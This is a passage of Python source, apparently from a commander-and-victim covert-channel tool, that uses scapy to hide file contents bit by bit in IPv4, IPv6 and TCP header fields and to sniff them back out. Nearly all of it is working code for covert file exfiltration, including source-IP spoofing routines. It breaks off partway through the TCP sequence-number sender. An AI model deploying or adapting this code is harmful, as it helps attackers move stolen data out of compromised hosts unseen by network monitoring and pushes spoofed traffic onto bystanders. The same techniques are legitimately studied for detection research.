def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
                        cmdr_port: int, source_ip: str,
                        source_port: int, choices: tuple, filename: str):
    # Initialize Variables
    received_packets = []

    # Print configuration
    print(constants.RECEIVING_FILE_MSG.format(filename))
    print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(choices[0], choices[1]))
    print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(choices[0], choices[1]))

    # Get function handler from a map (according to header/field)
    header_field_function_map = get_protocol_header_function_extract_map()
    if choices in header_field_function_map:
        selected_function = header_field_function_map.get(choices)

    # A callback function for handling of received packets
    def packet_callback(packet):
        global filename
        binary_data = selected_function(packet)
        return binary_data

    # DIFFERENT SNIFFS: For IPv4 Headers/Field
    if constants.IPV4 in choices:
        # Get total count of packets
        count = get_packet_count(cmdr_socket)

        if constants.SOURCE_ADDRESS_FIELD in choices:
            received_packets = sniff(filter="dst host {} and dst port {}"
                                     .format(source_ip, source_port), count=count)
        else:  # REGULAR IPv4 SNIFF
            received_packets = sniff(filter="src host {}".format(cmdr_ip), count=count)

    # DIFFERENT SNIFFS: For IPv6 Headers/Field
    if constants.IPV6 in choices:
        source_ipv6_ip, source_ipv6_port, cmdr_ipv6_addr = receive_get_ipv6_script(cmdr_socket,
                                                                                   cmdr_ip,
                                                                                   cmdr_port)

        # Get total count of packets
        count = get_packet_count(cmdr_socket)

        if constants.NEXT_HEADER in choices:
            received_packets = sniff(filter="src host {} and dst host {}"
                                     .format(cmdr_ipv6_addr, source_ipv6_ip),
                                     count=count)
        else:
            received_packets = sniff(filter="dst host {} and dst port {}"
                                     .format(source_ipv6_ip, source_ipv6_port),
                                     count=count)

    # DIFFERENT SNIFFS: For TCP Headers/Field
    if constants.TCP in choices:
        count = get_packet_count(cmdr_socket)

        if constants.SOURCE_PORT_FIELD in choices:
            received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
                                            "(tcp[13] & 0x004 == 0)"  # tcp[13] offset RST flag (0x004)
                                     .format(source_ip, source_port),
                                     count=count)

        elif constants.DESTINATION_PORT_FIELD in choices:
            received_packets = sniff(filter="tcp and dst host {} and src host {} and "
                                            "(tcp[13] & 0x004 == 0)"
                                     .format(source_ip, cmdr_ip),
                                     count=count)

        elif constants.FLAG in choices:  # Capture all flags
            received_packets = sniff(filter="tcp and dst host {} and dst port {}"
                                     .format(source_ip, source_port),
                                     count=count)
        else:
            received_packets = sniff(filter="tcp and dst host {} and dst port {} "
                                            "and tcp[13] & 0x004 == 0"
                                     .format(source_ip, source_port),
                                     count=count)

    # DIFFERENT SNIFFS: For UDP Headers/Field
    if constants.UDP in choices:
        count = get_packet_count(cmdr_socket)

        if constants.DESTINATION_PORT_FIELD in choices:
            received_packets = sniff(filter="udp and dst host {} and src host {}"
                                     .format(source_ip, cmdr_ip),
                                     count=count)
        else:
            received_packets = sniff(filter="udp and dst host {} and dst port {}"
                                     .format(source_ip, source_port),
                                     count=count)

    # DIFFERENT SNIFFS: For ICMP Header/Fields
    if constants.ICMP in choices:
        count = get_packet_count(cmdr_socket)

        received_packets = sniff(filter="icmp and dst host {} and src host {}"
                                 .format(source_ip, cmdr_ip),
                                 count=count)

    # Extract Data
    extracted_data = ''.join(packet_callback(packet)
                             for packet in received_packets if packet_callback(packet))

    # Write Data to File
    covert_data_write_to_file(extracted_data, filename)

    # Send ACK to commander (if good)
    if is_file_openable(filename):
        print(constants.TRANSFER_SUCCESS_MSG.format(filename))
        print(constants.AWAIT_NEXT_OP_MSG)
        print(constants.MENU_CLOSING_BANNER)
        cmdr_socket.send(constants.VICTIM_ACK.encode())
    else:
        cmdr_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
        print(constants.AWAIT_NEXT_OP_MSG)
        print(constants.MENU_CLOSING_BANNER)


# ================== COVERT FILE TRANSFER TO CMDR FUNCTIONS ==================


def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    TTL field.

    @note Bit length
        The TTL field for IPv4 headers is 8 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Split the binary data into chunks that fit within the TTL range (0-255)
    ttl_chunk_size = 8  # MAX SIZE is 8 bits == (1 char)
    chunks = [binary_data[i:i + ttl_chunk_size] for i in range(0, len(binary_data), ttl_chunk_size)]

    # d) Send total number of packets to the client
    total_packets = str(len(chunks))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Craft packets for each chunk and embed them with a corresponding TTL value
    for i, chunk in enumerate(chunks):
        # Convert the chunk to integer (0-255)
        chunk_value = int(chunk, 2)

        # Craft an IPv4 packet with the chunk value as TTL
        packet = IP(dst=dest_ip, ttl=chunk_value)

        # Send the packet
        send(packet, verbose=0)


def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    version field.

    @note Bit length
        The version field for IPv4 headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in a packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        version = int(binary_segment, 2)
        packet = IP(dst=dest_ip, version=version)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    IHL (Internet Header Length) field.

    @attention: // MAY CAUSE ISSUES DURING TRANSMISSION //
        Changing the IHL field of the IP header may cause
        packets to be dropped; thus may not be a viable solution
        for covert data hiding

    @note Bit length
        The IHL field for IPv4 headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        ihl = int(binary_segment, 2)
        packet = IP(dst=dest_ip, ihl=ihl)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    DS (differentiated services) field.

    @note Bit length
        The DS field for IPv4 headers is 6 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 6):
        binary_segment = binary_data[i:i + 6].ljust(6, '0')
        ds = int(binary_segment, 2)
        packet = IP(dst=dest_ip, tos=(ds << 2))
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    ECN field.

    @note Bit length
        The ECN field for IPv4 headers is 2 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 2):
        binary_segment = binary_data[i:i + 2].ljust(2, '0')
        ecn = int(binary_segment, 2)
        packet = IP(dst=dest_ip)
        packet.tos = (packet.tos & 0b11111100) | ecn  # Set first 2 bits (ECN) of ToS field
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    total length field.

    @note Bit length
        The total length field for IPv4 headers is 16 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        total_length = int(binary_segment, 2)
        packet = IP(dst=dest_ip)
        packet.len = total_length
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    identification field.

    @note Bit length
        The identification field for IPv4 headers is 16 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        identification = int(binary_segment, 2)
        packet = IP(dst=dest_ip, id=identification)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    flags field.

    @note Bit length
        The flags field for IPv4 headers is 3 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 3):  # 3 bit chunks
        binary_segment = binary_data[i:i + 3].ljust(3, '0')
        flag = int(binary_segment, 2)
        packet = IP(dst=dest_ip, flags=flag)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    fragment offset field.

    @note Bit length
        The fragment offset field for IPv4 headers is 13 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 13):
        binary_segment = binary_data[i:i + 13].ljust(13, '0')
        fragment_offset = int(binary_segment, 2)
        packet = IP(dst=dest_ip, frag=fragment_offset)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    protocol field.

    @note Bit length
        The protocol field for IPv4 headers is 8 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        protocol = int(binary_segment, 2)
        packet = IP(dst=dest_ip, proto=protocol)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    header checksum field.

    @note Bit length
        The header checksum field for IPv4 headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        checksum = int(binary_segment, 2)
        packet = IP(dst=dest_ip, chksum=checksum)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
                                client_port: int, src_port: int, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    source address field; uses TCP.

    @attention: // *** THIS IS SOURCE IP SPOOFING *** //
                Please use this wisely and with permission!!!

                This will send covert data under (SYN packets) to the victim; however -
                due to the TCP protocol, this forces the victim to send a
                SYN/ACK packet response to the spoofed addresses.

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param client_sock:
        A socket representing the client socket

    @param client_ip:
        A string representing the client IP

    @param client_port:
        An integer representing the client port

    @param src_port:
        An integer representing the source port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        src_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
        packet = IP(src=src_ip, dst=client_ip) / TCP(sport=src_port, dport=client_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    destination address field.

    @attention: // *** THIS IS DESTINATION IP SPOOFING *** //
                Changing the destination IP field of the IP header will
                cause the packets created to be sent out to random IP
                addresses.

                The target victim will not be able to receive any
                crafted packets; hence - any covert data.

    @note Bit length
        The destination address field for IPv4 headers is 32 bits (4 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        dst_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
        packet = IP(dst=dst_ip)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def __transfer_file_dst_addr_error_handler(field: str, header: str):
    print(constants.DESTINATION_ADDRESS_ERROR.format(field, header))
    print(constants.DESTINATION_ADDRESS_ERROR_REASON)
    print(constants.MENU_CLOSING_BANNER)


# ===================== IPV6 INSERT COVERT DATA FUNCTIONS =====================

def transfer_file_ipv6_version(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    version field.

    @note Bit length
        The version field for IPv6 headers is 4 bits

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        version = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, version=version) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
                                     dest_ip: str,
                                     dest_port: int,
                                     file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    traffic class field.

    @note Bit length
        The traffic class field for IPv6 headers is 8 bits

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        traffic_class = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, tc=traffic_class) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_flow_label(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
                                  file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    flow label field.

    @note Bit length
        The flow label field for IPv6 headers is 20 bits

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 20):
        binary_segment = binary_data[i:i + 20].ljust(20, '0')
        flow_label = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, fl=flow_label) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_payload_length(client_sock: socket.socket,
                                      dest_ip: str,
                                      dest_port: int,
                                      file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    payload length field.

    @note Bit length
        The payload length field for IPv6 headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        payload_length = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, plen=payload_length) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_next_header(client_sock: socket.socket,
                                   dest_ip: str,
                                   dest_port: int,
                                   file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    next header field.

    @note Bit length
        The next header field for IPv6 headers is 8 bits (1 byte)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        next_header = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, nh=next_header) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_hop_limit(client_sock: socket.socket,
                                 dest_ip: str,
                                 dest_port: int,
                                 file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    hop limit field.

    @note Bit length
        The hop limit field for IPv6 headers is 8 bits (1 byte)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        hop_limit = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, hlim=hop_limit) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_src_addr(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
                                file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    source address field.

    @attention: // *** THIS IS SOURCE IP SPOOFING *** //
                Please use this wisely and with permission!!!

                This will send covert data under (SYN packets) to the victim; however -
                due to the TCP protocol used here, this forces the victim to send a
                SYN/ACK packet response to the spoofed addresses.

    @note Bit length
        The source address field for IPv6 headers is 128 bits (16 bytes)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        src_addr = ':'.join([binary_segment[j:j + 4] for j in range(0, 32, 4)])
        packet = IPv6(dst=dest_ip, src=src_addr) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_dest_addr(client_sock: socket.socket,
                                 dest_ip: str,
                                 dest_port: int,
                                 file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    source address field.

    @attention: FUNCTIONALITY DISABLED
                Changing the destination IP field of the IP header will
                cause the packets created to be sent out to random IP
                addresses.

                The target victim will not be able to receive any
                crafted packets; hence - any covert data.

    @note Bit length
        The source address field for IPv6 headers is 128 bits (16 bytes)

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    print(constants.IPV6_DESTINATION_FIELD_ERROR)


# ===================== TCP INSERT COVERT DATA FUNCTIONS =====================


def transfer_file_tcp_src_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in TCP headers using the
    source port field.

    @note Bit length
        The source port field for TCP headers is 16 bits (2 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_src_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=new_src_port, dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_dst_port(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
                               file_path: str):
    """
    Hides file data covertly in TCP headers using the
    destination port field.

    @note Bit length
        The destination port field for TCP headers is 16 bits (2 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        new_dest_port = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=new_dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_tcp_seq_num(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
                              file_path: str):
    """
    Hides file data covertly in TCP headers using the
    sequence number field.

    @note Bit length
        The sequence number field for TCP headers is 32 bits (4 Bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param dest_port:
        A string representing the destination port

    @param src_port:
        A string representing the commander's port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        sequence_num = int(binary_segment, 2)
        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, seq=sequence_num)
        packets.append(packet)

